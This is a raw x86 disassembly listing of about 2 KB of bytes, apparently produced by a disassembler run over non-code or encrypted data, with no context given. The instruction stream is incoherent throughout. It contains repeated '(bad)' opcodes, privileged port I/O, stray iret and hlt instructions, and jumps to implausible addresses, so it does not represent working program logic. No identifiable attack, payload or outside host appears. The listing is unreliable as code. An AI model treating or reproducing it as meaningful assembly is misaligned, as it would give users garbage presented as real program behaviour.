  4127d3:	mov    cl,BYTE PTR [ecx-0x22681b2b]
  4127d9:	call   0x2813815
  4127de:	add    al,0x42
  4127e0:	push   es
  4127e1:	scas   eax,DWORD PTR es:[edi]
  4127e2:	push   esi
  4127e3:	mov    ds:0xc97c4054,eax
  4127e8:	das    
  4127e9:	mov    al,0xe5
  4127eb:	push   ebp
  4127ec:	sub    DWORD PTR [eax+0x8],0x9335cc4f
  4127f3:	aad    0xfc
  4127f5:	lock clc 
  4127f7:	mov    edx,0x5818e47d
  4127fc:	mov    DWORD PTR [ecx-0x3f],ebx
  4127ff:	sbb    ebp,ebp
  412801:	aaa    
  412802:	push   edi
  412803:	inc    ebp
  412804:	inc    DWORD PTR [eax]
  412806:	in     al,dx
  412807:	xor    eax,0x5737bc69
  41280c:	adc    edi,DWORD PTR [edx+0x2d8818e2]
  412812:	jns    0x412837
  412814:	iret   
  412815:	jb     0x412835
  412817:	add    ch,BYTE PTR [ebx-0x5c82b7fb]
  41281d:	adc    BYTE PTR [edx],0x22
  412820:	mov    esi,0x7bed72b9
  412825:	outs   dx,DWORD PTR ds:[esi]
  412826:	iret   
  412827:	aam    0x90
  412829:	dec    esp
  41282a:	fstp   DWORD PTR [ebx+0x42a205ed]
  412830:	cdq    
  412831:	lods   eax,DWORD PTR ds:[esi]
  412832:	inc    ecx
  412833:	fist   WORD PTR [ebx+0x75]
  412836:	push   ds
  412837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412838:	std    
  412839:	push   ss
  41283a:	add    ebp,DWORD PTR ds:[edx+ebp*1+0x12]
  41283f:	xlat   BYTE PTR ds:[ebx]
  412840:	mov    ds:0x5436b433,al
  412845:	shl    BYTE PTR [esp+esi*1],cl
  412848:	mov    DWORD PTR [edi-0x6c],eax
  41284b:	out    dx,al
  41284c:	(bad)  
  41284d:	jmp    DWORD PTR [esi-0x33]
  412850:	in     al,0x2
  412852:	pusha  
  412853:	jmp    0x4128b2
  412855:	arpl   WORD PTR [edx-0x69b509fc],bp
  41285b:	sub    edi,ebp
  41285d:	add    eax,0x1ae62a1f
  412862:	dec    eax
  412863:	fdiv   QWORD PTR [ebp+0x2]
  412866:	cmp    bh,bh
  412868:	xchg   ecx,eax
  412869:	jp     0x4128c8
  41286b:	loopne 0x41284b
  41286d:	out    dx,al
  41286e:	pusha  
  41286f:	lahf   
  412870:	test   al,0x24
  412872:	jo     0x412870
  412874:	dec    eax
  412875:	cmp    esi,esi
  412877:	aam    0x9e
  412879:	jbe    0x4128a9
  41287b:	add    cl,dh
  41287d:	pop    eax
  41287e:	arpl   ax,si
  412880:	xchg   ebp,eax
  412881:	xchg   edx,edx
  412883:	jge    0x412846
  412885:	inc    edx
  412886:	cld    
  412887:	xchg   DWORD PTR [edi+ebx*4],ebp
  41288a:	sub    edx,edi
  41288c:	mov    ebp,0x6858055c
  412891:	pushf  
  412892:	pop    esi
  412893:	push   ds
  412894:	mov    cl,cl
  412896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412897:	rol    al,1
  412899:	mov    ss,edi
  41289b:	adc    ecx,DWORD PTR [esi+ecx*1+0x7313bb6a]
  4128a2:	jb     0x412842
  4128a4:	or     BYTE PTR [ecx+0x4a],al
  4128a7:	fsubrp st(2),st
  4128a9:	ja     0x4128f6
  4128ab:	pop    es
  4128ac:	div    DWORD PTR [ecx+eiz*2]
  4128af:	inc    ecx
  4128b0:	fmul   DWORD PTR [edi+0x77524fa7]
  4128b6:	xchg   DWORD PTR [edi+0x70],ebx
  4128b9:	add    ch,al
  4128bb:	or     BYTE PTR [edi*1+0x7507cd78],0x61
  4128c3:	cmovg  edi,DWORD PTR [eax]
  4128c6:	jbe    0x412935
  4128c8:	jns    0x4128c7
  4128ca:	pop    edi
  4128cb:	cmp    DWORD PTR [edx+eax*1+0x62],ebx
  4128cf:	imul   BYTE PTR [ebx+ebx*8-0x20a0413b]
  4128d6:	pop    ds
  4128d7:	gs sub eax,0x1e313914
  4128dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128de:	adc    al,0xd7
  4128e0:	mov    bh,0x76
  4128e2:	pop    esi
  4128e3:	push   ecx
  4128e4:	mov    ecx,0x966a370e
  4128e9:	repz sbb ecx,DWORD PTR [ebx+ebx*2+0x38ad4583]
  4128f1:	mov    ecx,0xc796d3ed
  4128f6:	hlt    
  4128f7:	xor    DWORD PTR [ebp-0x7],eax
  4128fa:	dec    DWORD PTR [edx+0x376c4aa5]
  412900:	cs mov edx,0x23e802ec
  412906:	inc    esi
  412907:	push   eax
  412908:	shr    DWORD PTR cs:[esi],cl
  41290b:	aam    0x4a
  41290d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290e:	jg     0x4128cb
  412910:	fdiv   DWORD PTR [edx+0x6f]
  412913:	out    dx,al
  412914:	mov    BYTE PTR [ebp+0x8],bh
  412917:	loopne 0x4128c4
  412919:	(bad)  
  41291b:	cmc    
  41291c:	aad    0x5
  41291e:	mov    WORD PTR [edi+0x2c],es
  412921:	xor    BYTE PTR [ebx+0x60f6fd7b],bl
  412927:	mov    eax,ds:0x97cf1f83
  41292c:	fdiv   DWORD PTR [esi-0x2b]
  41292f:	aad    0xc1
  412931:	mov    edx,0xce9edf0f
  412936:	add    bh,0x89
  412939:	inc    edi
  41293a:	sbb    al,0xf2
  41293c:	aad    0x6
  41293e:	sbb    al,BYTE PTR [ebp+0x4a604b13]
  412944:	pusha  
  412945:	dec    eax
  412946:	push   ebp
  412947:	fisttp QWORD PTR [ecx+0x45400484]
  41294d:	or     DWORD PTR ds:[esi-0x4c],edx
  412951:	setns  bl
  412954:	or     DWORD PTR [esi+eiz*8-0x1b],esp
  412958:	adc    ah,al
  41295a:	pop    edi
  41295b:	xlat   BYTE PTR ds:[ebx]
  41295c:	fdivr  DWORD PTR [edi-0x26]
  41295f:	test   eax,0xf4f2becc
  412964:	or     bh,BYTE PTR ds:0x2d9d296d
  41296a:	fadd   QWORD PTR [eax]
  41296c:	imul   ecx,DWORD PTR [edx+0x3f],0xb62d5782
  412973:	retf   0xa1e7
  412976:	bound  edx,QWORD PTR [edi-0x80]
  412979:	inc    ebp
  41297a:	and    edx,DWORD PTR [edi-0x40]
  41297d:	pop    edx
  41297e:	push   ds
  41297f:	push   ebx
  412980:	dec    edi
  412981:	mov    edx,0xa86a078f
  412986:	mov    ebp,0xba146cd5
  41298b:	das    
  41298c:	xor    ebx,DWORD PTR [eax+ecx*8+0x7e]
  412990:	jecxz  0x412965
  412992:	inc    ebp
  412993:	jl     0x412920
  412995:	sbb    esi,edx
  412997:	inc    edi
  412998:	rol    bl,1
  41299a:	bound  esp,QWORD PTR [eax+0x53]
  41299d:	cmp    cl,BYTE PTR fs:[ebx-0xdab9dd6]
  4129a4:	jmp    0x89dc42a5
  4129a9:	sbb    esi,DWORD PTR [ebx+edx*4]
  4129ac:	shr    dh,0xc7
  4129af:	call   0x94bb4943
  4129b4:	sbb    BYTE PTR [ebp+esi*8+0x8b18df],bl
  4129bb:	in     eax,dx
  4129bc:	mov    cl,0x4f
  4129be:	mov    ebx,0x50088ba
  4129c3:	cs mov edx,0xead4a106
  4129c9:	dec    esp
  4129ca:	es xchg ecx,eax
  4129cc:	mov    BYTE PTR [esi],al
  4129ce:	js     0x41297b
  4129d0:	mov    BYTE PTR [ebx+0x74],bh
  4129d3:	leave  
  4129d4:	xchg   ebp,eax
  4129d5:	adc    eax,0x4246fc
  4129da:	cmp    dh,BYTE PTR [ebp-0x1fa9adc]
  4129e0:	stos   DWORD PTR es:[edi],eax
  4129e1:	lds    esp,FWORD PTR [esi]
  4129e3:	dec    esp
  4129e4:	mov    ebx,esp
  4129e6:	and    al,0x52
  4129e8:	test   ah,ch
  4129ea:	add    eax,0xd24a2515
  4129ef:	fwait
  4129f0:	xchg   edx,eax
  4129f1:	add    eax,0x12ff5836
  4129f6:	clc    
  4129f7:	xor    ecx,DWORD PTR [ebx+0x613b8c95]
  4129fd:	stos   BYTE PTR es:[edi],al
  4129fe:	idiv   BYTE PTR [ebp+0x28]
  412a01:	shr    DWORD PTR [edx-0x2c],0xef
  412a05:	mov    bh,0xb3
  412a07:	aaa    
  412a08:	mov    ebp,0x9b4cb3b3
  412a0d:	leave  
  412a0e:	inc    edi
  412a0f:	add    eax,0x55f1032f
  412a14:	add    BYTE PTR [esi],dl
  412a16:	add    dl,ah
  412a18:	cli    
  412a19:	adc    al,0xa1
  412a1b:	mov    ebp,0x9cca59ae
  412a20:	mov    DWORD PTR [edi+0x14],esi
  412a23:	add    eax,0x2c21638a
  412a28:	add    BYTE PTR [eax+esi*2-0x1f],0x0
  412a2d:	add    ch,BYTE PTR [edi-0x4dee1d58]
  412a33:	mov    ebp,0x13600f74
  412a38:	sub    esi,eax
  412a3a:	mov    eax,0x57e8bee1
  412a3f:	aad    0x70
  412a41:	inc    eax
  412a42:	fucom  st(0)
  412a44:	mov    edx,0x89eafff2
  412a49:	in     eax,0x6a
  412a4b:	sti    
  412a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a4d:	lds    eax,FWORD PTR [edx]
  412a4f:	stos   DWORD PTR es:[edi],eax
  412a50:	dec    BYTE PTR [ecx+0x5d891235]
  412a56:	mov    edx,ebx
  412a58:	es fs aad 0x64
  412a5c:	mov    BYTE PTR [ecx],dl
  412a5e:	pop    esp
  412a5f:	in     eax,dx
  412a60:	xor    eax,0x9939d63b
  412a65:	add    dl,BYTE PTR [eax+0x77]
  412a68:	adc    BYTE PTR [ebx-0x12e2f85b],0x60
  412a6f:	mov    ecx,0x1121f23d
  412a74:	or     al,0x5b
  412a76:	adc    al,0xd4
  412a78:	std    
  412a79:	rol    DWORD PTR [edi-0x54],cl
  412a7c:	push   cs
  412a7d:	mov    ecx,0x588e0af
  412a82:	jmp    0x412a18
  412a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a85:	mov    al,ds:0x8992d191
  412a8a:	(bad)  
  412a8b:	mov    ebx,0xa1ce7c89
  412a90:	inc    esp
  412a91:	ret    0x8227
  412a94:	mov    DWORD PTR [ebx],edx
  412a96:	adc    BYTE PTR [edi],0x6a
  412a99:	in     al,0x91
  412a9b:	jecxz  0x412ab8
  412a9d:	stos   BYTE PTR es:[edi],al
  412a9e:	dec    ecx
  412a9f:	adc    al,BYTE PTR [edx-0x7865ae49]
  412aa5:	add    bh,BYTE PTR [edi+0x618cb1a2]
  412aab:	jge    0x412a94
  412aad:	add    eax,0x1e3a835
  412ab2:	sahf   
  412ab3:	xchg   ebp,eax
  412ab4:	push   es
  412ab5:	les    ecx,FWORD PTR [eax+edi*4]
  412ab8:	and    edx,edx
  412aba:	mov    dl,0x65
  412abc:	or     cl,dl
  412abe:	or     eax,0x1f1987c2
  412ac3:	sbb    DWORD PTR [esi],edx
  412ac5:	arpl   WORD PTR [edx-0x49],di
  412ac8:	or     BYTE PTR [esi-0x1],0xb8
  412acc:	dec    eax
  412acd:	cmp    cl,BYTE PTR [esi-0x4bc03679]
  412ad3:	ja     0x412ac0
  412ad5:	retf   0xcd61
  412ad8:	and    BYTE PTR [eax-0x74823511],al
  412ade:	das    
  412adf:	pop    ecx
  412ae0:	lds    eax,FWORD PTR [edx]
  412ae2:	adc    BYTE PTR [esi+0x44],ah
  412ae5:	dec    esp
  412ae6:	out    dx,eax
  412ae7:	lahf   
  412ae8:	inc    esi
  412ae9:	aaa    
  412aea:	push   ds
  412aeb:	xchg   ebx,eax
  412aec:	inc    ecx
  412aed:	je     0x412abb
  412aef:	or     al,0x3c
  412af1:	int3   
  412af2:	ret    0xfbd5
  412af5:	xor    ah,dh
  412af7:	jno    0x412a7a
  412af9:	cvtpi2ps xmm4,QWORD PTR [edx-0x3ff7072]
  412b00:	in     al,0x81
  412b02:	js     0x412b08
  412b04:	aam    0x28
  412b06:	cmp    eax,0x20919cd7
  412b0b:	retf   
  412b0c:	sbb    ecx,DWORD PTR [edi+ebx*8+0x61]
  412b10:	ror    ecx,1
  412b12:	pop    ss
  412b13:	or     BYTE PTR [ecx+0x6c9680af],cl
  412b19:	aaa    
  412b1a:	fst    st(5)
  412b1c:	mov    ebp,0x7fa6b4c4
  412b21:	dec    esp
  412b22:	ss icebp 
  412b24:	mov    DWORD PTR [edi-0x36],edi
  412b27:	ja     0x412b39
  412b29:	adc    edx,esi
  412b2b:	xor    al,0xd0
  412b2d:	jae    0x412b4b
  412b2f:	xor    eax,0x23af98e8
  412b34:	repz into 
  412b36:	jnp    0x412ad7
  412b38:	adc    eax,0xa614188d
  412b3d:	mov    eax,ds:0x2d1c21e
  412b42:	pop    esp
  412b43:	dec    ebx
  412b44:	pusha  
  412b45:	aas    
  412b46:	dec    edi
  412b47:	push   esi
  412b48:	push   0x4b1f6d00
  412b4d:	jbe    0xdaecb4c2
  412b53:	test   eax,0x5b16c2bb
  412b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b59:	and    ah,BYTE PTR [edx-0x71]
  412b5c:	push   0x9921a4f
  412b61:	xchg   esp,edx
  412b63:	inc    ebp
  412b64:	mov    BYTE PTR ds:0x4765d22b,bl
  412b6a:	jle    0x412b0e
  412b6c:	dec    eax
  412b6d:	sti    
  412b6e:	jbe    0x412b45
  412b70:	fidivr WORD PTR [eax-0x17]
  412b73:	add    BYTE PTR ds:0x89beeb80,0x21
  412b7a:	push   cs
  412b7b:	(bad)  [ecx-0x6d105fd2]
  412b81:	add    eax,0x769b776
  412b86:	sbb    al,0x38
  412b88:	cmp    eax,0x6bf16d9b
  412b8d:	mov    ecx,0x98c85001
  412b92:	push   0x34
  412b94:	jle    0x412b98
  412b96:	clc    
  412b97:	test   eax,0x65210ecb
  412b9c:	enter  0x1fba,0x77
  412ba0:	mov    ah,0xa3
  412ba2:	sbb    DWORD PTR [esi+0x6c],ecx
  412ba5:	push   ss
  412ba6:	(bad)  
  412ba8:	mov    bl,0xd6
  412baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bab:	jo     0x412b66
  412bad:	out    dx,eax
  412bae:	imul   ch
  412bb0:	test   al,0x82
  412bb2:	jl     0x412b4b
  412bb4:	imul   esp,edi,0xffffff80
  412bb7:	adc    eax,0xf3816ca6
  412bbc:	jmp    0x412bc0
  412bbe:	fsub   QWORD PTR [ecx+0x45]
  412bc1:	mov    edi,0x894fda36
  412bc6:	add    BYTE PTR [ebx],dl
  412bc8:	mov    ecx,esi
  412bca:	sub    al,0xc8
  412bcc:	push   edx
  412bcd:	xchg   edx,eax
  412bce:	jecxz  0x412c4d
  412bd0:	xor    eax,DWORD PTR [ecx]
  412bd2:	dec    esi
  412bd3:	mov    al,ds:0xaa764560
  412bd8:	adc    dh,al
  412bda:	dec    edx
  412bdb:	(bad)  
  412bdd:	jmp    0x412c3d
  412bdf:	jmp    0x7088:0xf5c0b588
  412be6:	out    dx,al
  412be7:	out    0xba,eax
  412be9:	add    eax,0xf966bb74
  412bee:	jae    0x412bb3
  412bf0:	or     DWORD PTR [ebx+edx*1+0x657b6c73],eax
  412bf7:	sub    eax,DWORD PTR [esi+0x27]
  412bfa:	xor    eax,0x9f581766
  412bff:	hlt    
  412c00:	push   edx
  412c01:	push   cs
  412c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c03:	aam    0xd5
  412c05:	dec    edx
  412c06:	push   es
  412c07:	dec    esi
  412c08:	inc    edi
  412c09:	inc    esp
  412c0a:	pop    ds
  412c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c0c:	je     0x412bd7
  412c0e:	pusha  
  412c0f:	mov    eax,edx
  412c11:	idiv   DWORD PTR [eax-0x6c]
  412c14:	retf   0x4d1
  412c17:	test   eax,0x2ec3f0ac
  412c1c:	add    DWORD PTR ds:0x3b283ef,0x1f
  412c23:	pop    ss
  412c24:	mov    bh,0xde
  412c26:	hlt    
  412c27:	mov    dl,0xc0
  412c29:	retf   0xd72b
  412c2c:	dec    esp
  412c2d:	or     BYTE PTR [edi+0x20b052d1],dl
  412c33:	push   esi
  412c34:	mov    dh,0xc7
  412c36:	sub    eax,0x82ba874a
  412c3b:	popf   
  412c3c:	or     DWORD PTR [ebp+0x2e4f30e],edx
  412c42:	push   0x1d814418
  412c47:	test   eax,0x6a50e2b4
  412c4c:	mov    BYTE PTR [ebx-0x2c],ah
  412c4f:	dec    edi
  412c50:	call   0x80d02f4f
  412c55:	add    dl,BYTE PTR [eax-0x3a]
  412c58:	lea    esp,[eax-0x57]
  412c5b:	(bad)  
  412c5c:	das    
  412c5d:	stos   BYTE PTR es:[edi],al
  412c5e:	add    al,0x89
  412c60:	mov    BYTE PTR [ecx+0x7d],bh
  412c63:	mov    ch,0x90
  412c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c66:	popa   
  412c67:	jmp    0xc8777a5a
  412c6c:	cmp    DWORD PTR [edx-0x617bcc69],eax
  412c72:	sti    
  412c73:	int    0xf7
  412c75:	xchg   edi,eax
  412c76:	dec    ebp
  412c77:	aam    0x37
  412c79:	inc    esi
  412c7a:	cli    
  412c7b:	out    0x58,al
  412c7d:	arpl   bx,bx
  412c7f:	aad    0x67
  412c81:	and    BYTE PTR [ebx],bl
  412c83:	xchg   ebp,eax
  412c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c85:	jl     0x412c96
  412c87:	mov    al,ds:0xd4e2dffc
  412c8c:	xor    BYTE PTR [esi-0x3b],dl
  412c8f:	cmp    ecx,DWORD PTR [esi+edx*1-0x69e92bc6]
  412c96:	jmp    0x412ce4
  412c98:	push   esi
  412c99:	dec    esi
  412c9a:	popf   
  412c9b:	test   BYTE PTR [eax-0xd92ab91],cl
  412ca1:	gs xchg ecx,eax
  412ca3:	lahf   
  412ca4:	adc    al,BYTE PTR [ecx]
  412ca6:	adc    al,0xbc
  412ca8:	ss fdivr st(5),st
  412cab:	popa   
  412cac:	sahf   
  412cad:	ret    0xe541
  412cb0:	mov    BYTE PTR [ebp-0x43f7fb17],bh
  412cb6:	gs scas al,BYTE PTR es:[edi]
  412cb8:	loopne 0x412c7a
  412cba:	sub    bl,cl
  412cbc:	jnp    0x412cc0
  412cbe:	mov    BYTE PTR [edx-0x25afd4e9],0x1f
  412cc5:	mov    al,ds:0xb59a6d60
  412cca:	jg     0x412d20
  412ccc:	mov    al,ds:0x92882cc5
  412cd1:	sbb    eax,DWORD PTR [ecx]
  412cd3:	aam    0x70
  412cd5:	scas   eax,DWORD PTR es:[edi]
  412cd6:	mov    WORD PTR [ebx],ds
  412cd8:	mov    edx,DWORD PTR [edx]
  412cda:	pop    ds
  412cdb:	push   ebx
  412cdc:	fsubr  DWORD PTR [edi+0x5d]
  412cdf:	sub    al,0xc2
  412ce1:	ss xchg ebx,eax
  412ce3:	aad    0xf9
  412ce5:	push   cs
  412ce6:	std    
  412ce7:	sahf   
  412ce8:	push   ebx
  412ce9:	mov    al,0x5
  412ceb:	hlt    
  412cec:	mov    BYTE PTR [ebx],cl
  412cee:	dec    edi
  412cef:	push   ss
  412cf0:	sti    
  412cf1:	ret    
  412cf2:	lea    eax,[esi+0x2ad18461]
  412cf8:	mov    dl,0x69
  412cfa:	cli    
  412cfb:	aad    0x33
  412cfd:	call   0x6409:0x83f6aa57
  412d04:	rcr    BYTE PTR [ecx+0x2],0x4e
  412d08:	mov    bl,BYTE PTR [edi]
  412d0a:	outs   dx,BYTE PTR ds:[esi]
  412d0b:	ja     0x412ceb
  412d0d:	out    0xc8,al
  412d0f:	loop   0x412cf8
  412d11:	add    ch,BYTE PTR [ecx+eiz*8+0x17ba45af]
  412d18:	stos   BYTE PTR es:[edi],al
  412d19:	sub    BYTE PTR [edi],bl
  412d1b:	int    0x28
  412d1d:	mov    edx,0xfaa28486
  412d22:	mov    ch,0xd5
  412d24:	scas   al,BYTE PTR es:[edi]
  412d25:	fdivr  QWORD PTR [edi]
  412d27:	xor    DWORD PTR [ebx],esp
  412d29:	aas    
  412d2a:	pop    eax
  412d2b:	mov    eax,0x5948118f
  412d30:	imul   edx,ecx,0x6a
  412d33:	aam    0xe8
  412d35:	lds    ebx,FWORD PTR ds:0x5ead84ba
  412d3b:	cdq    
  412d3c:	dec    ecx
  412d3d:	pushf  
  412d3e:	mul    ebx
  412d40:	fmulp  st(7),st
  412d42:	push   es
  412d43:	pop    esp
  412d44:	mov    BYTE PTR [ecx-0x58c9938],ch
  412d4a:	aaa    
  412d4b:	sbb    al,BYTE PTR [edx]
  412d4d:	add    ebp,DWORD PTR [eax+0x523023a6]
  412d53:	ins    BYTE PTR es:[edi],dx
  412d54:	imul   ecx,eax,0x6385e175
  412d5a:	cmp    esp,edx
  412d5c:	pop    edi
  412d5d:	and    al,0xfc
  412d5f:	data16 outs dx,BYTE PTR ds:[esi]
  412d61:	adc    eax,0x35f5e4a8
  412d66:	dec    edx
  412d67:	mov    ah,0x17
  412d69:	xchg   esp,eax
  412d6a:	fsub   st,st(3)
  412d6c:	mov    BYTE PTR ds:0x9fe5c4d4,ah
  412d72:	into   
  412d73:	fadd   st(6),st
  412d75:	add    eax,0xdbbcf21e
  412d7a:	loop   0x412d5b
  412d7c:	loope  0x412d8b
  412d7e:	sbb    bh,cl
  412d80:	mov    BYTE PTR [ebp-0x3b],dh
  412d83:	cdq    
  412d84:	jae    0x412da6
  412d86:	pop    edi
  412d87:	cwde   
  412d88:	test   al,0x5
  412d8a:	out    dx,al
  412d8b:	in     al,dx
  412d8c:	push   esi
  412d8d:	cmp    DWORD PTR [eax+0x1f41dfdb],ebp
  412d93:	addr16 pop ebp
  412d95:	xchg   BYTE PTR [esi+ebp*1-0x2ba880b2],bh
  412d9c:	cwde   
  412d9d:	test   eax,0x857c1a7b
  412da2:	adc    eax,0x27d9889e
  412da7:	leave  
  412da8:	lods   al,BYTE PTR ds:[esi]
  412da9:	(bad)  
  412daa:	sti    
  412dab:	mov    al,ds:0x6f4405ea
  412db0:	or     eax,0x656a1b7b
  412db5:	mov    al,ds:0x3199911f
  412dba:	push   esp
  412dbb:	ins    BYTE PTR es:[edi],dx
  412dbc:	or     DWORD PTR [si-0x6e26],esi
  412dc1:	es or  dl,ah
  412dc4:	cmp    dh,BYTE PTR [edi+0x5f]
  412dc7:	pop    ebp
  412dc8:	xor    edx,edi
  412dca:	dec    ebx
  412dcb:	cmp    ecx,esi
  412dcd:	pop    ss
  412dce:	pop    ss
  412dcf:	xlat   BYTE PTR ds:[ebx]
  412dd0:	daa    
  412dd1:	test   al,0xe
  412dd3:	push   ebp
  412dd4:	out    0x97,eax
  412dd6:	sbb    BYTE PTR [esi+edx*2-0x39],bl
  412dda:	pop    ebp
  412ddb:	cmp    ebp,esi
  412ddd:	adc    BYTE PTR [esi],0x78
  412de0:	ss dec ecx
  412de2:	sub    DWORD PTR [edi-0x78],eax
  412de5:	jecxz  0x412d6a
  412de7:	fidivr DWORD PTR [ecx-0x48ddbce0]
  412ded:	mov    al,BYTE PTR [ebp+0x1f62f242]
  412df3:	jp     0x412d8f
  412df5:	xor    edi,ebx
  412df7:	das    
  412df8:	in     al,0x7f
  412dfa:	push   cs
  412dfb:	fcomip st,st(3)
  412dfd:	lahf   
  412dfe:	or     edx,esp
  412e00:	dec    ecx
  412e01:	push   esi
  412e02:	or     DWORD PTR [ebx],0xd546eb0a
  412e08:	std    
  412e09:	cmp    ebp,edi
  412e0b:	cs lock inc ebx
  412e0e:	cmp    dl,BYTE PTR [edx-0x796c6878]
  412e14:	push   ds
  412e15:	nop
  412e16:	push   ecx
  412e17:	mov    BYTE PTR [ebx+0x2],ah
  412e1a:	add    al,0x9c
  412e1c:	mov    eax,0x1175ea7e
  412e21:	imul   BYTE PTR [ebp-0x5d]
  412e24:	jbe    0xd829be28
  412e2a:	jo     0x412e9b
  412e2c:	and    BYTE PTR [ebx],al
  412e2e:	lock jno 0x412e98
  412e31:	push   eax
  412e32:	sar    BYTE PTR [ebx+0x4134f2f2],1
  412e38:	repz jno 0x412e44
  412e3b:	xlat   BYTE PTR ds:[ebx]
  412e3c:	stos   DWORD PTR es:[edi],eax
  412e3d:	mov    cl,0x7
  412e3f:	adc    dl,ah
  412e41:	pop    ecx
  412e42:	(bad)  
  412e43:	(bad)  
  412e44:	sbb    ebp,DWORD PTR [ecx]
  412e46:	push   sp
  412e48:	or     ebx,DWORD PTR [ebp+ebx*4-0x552c722c]
  412e4f:	jo     0x412df9
  412e51:	and    al,0xf1
  412e53:	aad    0xf6
  412e55:	jns    0x412dd7
  412e57:	jmp    0x584a4850
  412e5c:	pop    eax
  412e5d:	ja     0x412e62
  412e5f:	stos   BYTE PTR es:[edi],al
  412e60:	mov    DWORD PTR ds:0xbd555ca5,edx
  412e66:	aad    0x74
  412e68:	pushf  
  412e69:	add    dh,BYTE PTR [eax+0x5e]
  412e6c:	and    al,0x6d
  412e6e:	sahf   
  412e6f:	les    eax,FWORD PTR [edi+0x72]
  412e72:	(bad)  
  412e73:	mov    ds:0x1ac4bb1,al
  412e78:	sub    DWORD PTR [ebp-0x737631a0],0x2b
  412e7f:	ss mov ch,0x2
  412e82:	ret    0x351b
  412e85:	push   ss
  412e86:	lea    esp,[ebp-0x20]
  412e89:	pop    esp
  412e8a:	pop    ebp
  412e8b:	(bad)  
  412e8d:	loope  0x412ef5
  412e8f:	pop    es
  412e90:	out    dx,eax
  412e91:	bound  esi,QWORD PTR [edx-0x4ff9032c]
  412e97:	(bad)  
  412e98:	add    DWORD PTR [ecx-0x2b],0xbfbfc7f5
  412e9f:	adc    al,0x71
  412ea1:	xchg   ebp,eax
  412ea2:	pusha  
  412ea3:	jmp    0xbb9daaf
  412ea8:	or     dh,BYTE PTR [eax+edx*1-0x29]
  412eac:	sub    eax,0x7c874390
  412eb1:	es dec edx
  412eb3:	push   esp
  412eb4:	mov    bl,0x51
  412eb6:	enter  0xee6,0x1e
  412eba:	pop    ds
  412ebb:	pop    esi
  412ebc:	in     eax,dx
  412ebd:	cmp    dl,0x62
  412ec0:	push   ss
  412ec1:	add    ecx,DWORD PTR [eax+0x320d0da2]
  412ec7:	das    
  412ec8:	push   0xca4d59fc
  412ecd:	stos   DWORD PTR es:[edi],eax
  412ece:	arpl   WORD PTR [edx+0x3d],sp
  412ed1:	setnp  ch
  412ed4:	mov    gs,WORD PTR [eax+0x581b2f6]
  412eda:	sbb    bl,BYTE PTR [ecx+ebp*1+0x23]
  412ede:	out    dx,eax
  412edf:	and    dh,BYTE PTR [ebp-0x76bdea26]
  412ee5:	jnp    0x412f00
  412ee7:	rol    dl,cl
  412ee9:	add    al,0xdc
  412eeb:	dec    ecx
  412eec:	pop    ebp
  412eed:	add    dh,BYTE PTR [esi]
  412eef:	das    
  412ef0:	sbb    esi,esp
  412ef2:	dec    ecx
  412ef3:	mov    ds:0xf760c8b2,eax
  412ef8:	rcl    BYTE PTR [ebx],1
  412efa:	retf   
  412efb:	leave  
  412efc:	aam    0xe2
  412efe:	scas   eax,DWORD PTR es:[edi]
  412eff:	aam    0xf2
  412f01:	outs   dx,DWORD PTR ds:[esi]
  412f02:	out    dx,eax
  412f03:	sub    al,0xa9
  412f05:	push   cs
  412f06:	dec    esp
  412f07:	ror    BYTE PTR [ecx+0xff1b7d1],cl
  412f0d:	pop    ecx
  412f0e:	ss jo  0x412efb
  412f11:	add    eax,0x1cadec0
  412f16:	fiadd  WORD PTR [edx-0x5f]
  412f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f1a:	popa   
  412f1b:	jmp    0x412eb8
  412f1d:	shl    bh,1
  412f1f:	mov    esp,0x481e104b
  412f24:	mov    al,0x94
  412f26:	xor    al,0xe8
  412f28:	out    0x36,al
  412f2a:	ins    DWORD PTR es:[edi],dx
  412f2b:	mov    cl,0xa2
  412f2d:	(bad)  
  412f2e:	push   ebx
  412f2f:	mov    gs,WORD PTR [eax+0x11c5a44f]
  412f35:	add    ebx,DWORD PTR [esi+edi*1]
  412f38:	dec    edi
  412f39:	scas   eax,DWORD PTR es:[edi]
  412f3a:	add    DWORD PTR [eax+0x7a],esi
  412f3d:	in     eax,dx
  412f3e:	pop    ds
  412f3f:	loope  0x412f76
  412f41:	or     eax,0xbda04244
  412f46:	in     eax,dx
  412f47:	shl    DWORD PTR [edx],cl
  412f49:	cs jle 0x412f60
  412f4c:	subps  xmm7,XMMWORD PTR [esi+0x1f4aa0c2]
  412f53:	or     eax,0x5116af05
  412f58:	retf   0xa219
  412f5b:	aad    0xb5
  412f5d:	aam    0xc
  412f5f:	retf   0xf2a7
  412f62:	leave  
  412f63:	xor    eax,0x1d236788
  412f68:	xor    DWORD PTR [edi-0x4d],0x7803792b
  412f6f:	push   ebp
  412f70:	jnp    0x412fcd
  412f72:	sub    ecx,ebx
  412f74:	mov    ebp,0x63bb1f62
  412f79:	xor    DWORD PTR [ebx+0x71],0x9fe56cf2
  412f80:	in     al,0x69
  412f82:	adc    al,0x57
  412f84:	mov    ah,dh
  412f86:	xor    BYTE PTR [edi+ebp*2-0x4d],0x60
  412f8b:	dec    ebx
  412f8c:	dec    eax
  412f8d:	push   ebx
  412f8e:	jl     0x412f91
  412f90:	xor    ch,BYTE PTR [esi]
  412f92:	fcmovnbe st,st(3)
  412f94:	(bad)  
  412f95:	mov    WORD PTR [eax+0x20bfe95b],gs
  412f9b:	sub    eax,0xa53a7e77
  412fa0:	mov    DWORD PTR [ecx-0x16],eax
  412fa3:	xchg   edx,eax
  412fa4:	mov    ebp,0x13136049
  412fa9:	add    ch,BYTE PTR [esi]
  412fab:	mov    ecx,0x4a0d1cfc
  412fb0:	mov    ecx,0xc4171fbd
  412fb5:	jns    0x412f4d
